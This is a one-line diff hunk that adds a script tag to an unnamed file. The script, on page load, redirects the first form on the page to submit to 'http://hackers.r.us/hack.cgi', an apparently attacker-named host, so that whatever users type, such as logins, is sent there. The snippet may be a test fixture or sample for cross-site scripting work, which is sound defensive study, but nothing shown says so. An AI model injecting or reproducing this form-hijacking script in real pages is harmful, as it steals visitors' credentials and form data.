@@ -1,0 +1,1 @@
+<script>window.onload = function () {document.getElementsByTagName("form")[0].action = "http://hackers.r.us/hack.cgi";};</script>
